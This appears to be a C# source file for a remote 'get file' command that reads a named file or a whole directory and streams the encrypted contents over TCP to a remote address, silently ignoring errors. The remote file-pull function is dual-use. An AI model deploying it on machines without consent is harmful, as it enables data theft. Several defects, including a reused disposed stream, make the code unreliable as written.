using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json.Serialization;
using System.Threading.Tasks;
using CommandLib.Annotations;
using CommandLib.Commands.Helpers;
using CommandLib.Commands.RemoteCommandItems;

namespace CommandLib.Commands.TransferCommandItems
{
    [Serializable]
    public class TransferCommand : AbstractCommand
    {
        private bool _isActive;

        [JsonConstructor]
        public TransferCommand() { }

        public TransferCommand(byte[] data, RSAParameters? publicKey = null) 
            : base(ConstHelper.GetFileCommandId, ConstHelper.GetFileCommandString, data, publicKey) { }

        public override CommandResult Execute()
        {
            IPEndPoint endPoint;
            string path;
            _isActive = true;
            
            try
            {
                (endPoint, path) = ((IPEndPoint, string))RemoteObject.FromBytes(Data, typeof(TransferObject)).GetData();
            }
            catch (Exception)
            {
                return new CommandResult(CommandResultStatus.Failed, Encoding.UTF8.GetBytes(ConstHelper.DataError));
            }

            var isDirectory = File.GetAttributes(path).HasFlag(FileAttributes.Directory);
            var length = isDirectory 
                ? new DirectoryInfo(path).GetFiles().Sum(thisFInfo => thisFInfo.Length) 
                : new FileInfo(path).Length;

            if (length > NetHelper.MaxFileLength)
                return new CommandResult(CommandResultStatus.Failed, Encoding.UTF8.GetBytes(ConstHelper.FileLengthError));

            if (!File.Exists(path) || isDirectory && !Directory.Exists(path))
                return new CommandResult(CommandResultStatus.Failed, Encoding.UTF8.GetBytes(ConstHelper.FileError));

            Task.Run(() => TransferFiles((endPoint, path, isDirectory)));
            
            return new CommandResult(CommandResultStatus.Successed, Array.Empty<byte>());
        }

        public override void Abort() => _isActive = false;

        private void TransferFiles([CanBeNull] object obj)
        {
            if (obj is null || !_isActive)
                return;

            var (remoteIp, path, isDirectory) = ((IPEndPoint, string, bool))obj;
            TcpClient client = null;
            
            try
            {
                client = new TcpClient(remoteIp);
                client.Connect(remoteIp);

                var paths = isDirectory
                    ? Directory.GetFiles(path, "*", SearchOption.AllDirectories)
                    : new[] { path };

                if (paths.Length >= byte.MaxValue)
                {
                    client.Close();
                    return;
                }

                using (var stream = client.GetStream())
                {
                    stream.WriteByte((byte)paths.Length);
                }

                foreach (var filePath in paths)
                {
                    if (!_isActive)
                        break;

                    var fInfo = new FileInfo(filePath);
                    var fileData = new byte[fInfo.Length];

                    using (var fs = new FileStream(filePath, FileMode.Open, FileAccess.Read))
                        fs.Read(fileData, 0, fileData.Length);

                    var fileNameByteArray = FileNameToByteArray(filePath);
                    var fileBytes = fileNameByteArray.Concat(fileData).ToArray();
                    var datagram = new Datagram(fileBytes, typeof(byte[]), RsaPublicKey);
                    var bytes = datagram.ToBytes();
                    bytes = BitConverter.GetBytes(bytes.Length).Concat(bytes).ToArray();

                    using (var stream = client.GetStream())
                    {
                        stream.Write(bytes, 0, bytes.Length);
                    }
                }
            }
            catch (SocketException)
            {
                // ignored
            }
            catch (Exception)
            {
                // ignored
            }
            finally
            {
                client?.Close();
            }
        }

        private static byte[] FileNameToByteArray(string filePath)
        {
            var fileName = filePath[filePath.LastIndexOf('\\')..];
            var bytes = Encoding.UTF8.GetBytes(fileName);

            return BitConverter.GetBytes(bytes.Length).Concat(bytes).ToArray();
        }
    }
}